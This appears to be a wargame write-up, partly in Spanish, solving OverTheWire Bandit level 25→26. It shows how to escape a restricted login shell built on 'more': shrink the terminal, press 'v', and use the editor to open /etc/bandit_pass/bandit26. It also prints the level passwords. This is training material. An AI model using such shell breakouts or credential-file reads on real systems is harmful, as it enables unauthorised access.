## Objetivo

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

## Datos de acceso al nivel

-   user -> **bandit25**
-   Password -> p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
-   host -> **bandit.labs.overthewire.org**

## Solución
```
bandit25@bandit:~$ ls
bandit26.sshkey
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p2220
Connection to localhost closed.
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p2220
v

:e /etc/bandit_pass/bandit26

c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```
## Notas adicionales

#### Definiciones que entender

- **ssh -i bandit26.sshkey bandit26@localhost -p2220**: Al momento de teclear este comando tenemos que entrar pero con la pantalla reducida, en el cmd donde estemos trabajando nos dira que no se a cargado completamente las cosas por completo y ahi es donde oprimiremos la tecla v y luego teclearemos el siguiente comando para entrar directo a la carpeta bandit26 **:e /etc/bandit_pass/bandit26** para poder obtener la contraseña del bandit26 y listo.

- En caso contrario si tienes una ventana más grande que el texto que te muestra, en este caso “bandit26”, se ejecutará y cerrará, es decir, cerrara la sesión.

## Referencias
- https://medium.com/@coturnix97/overthewires-bandit-25-26-shell-355d78fd2f4d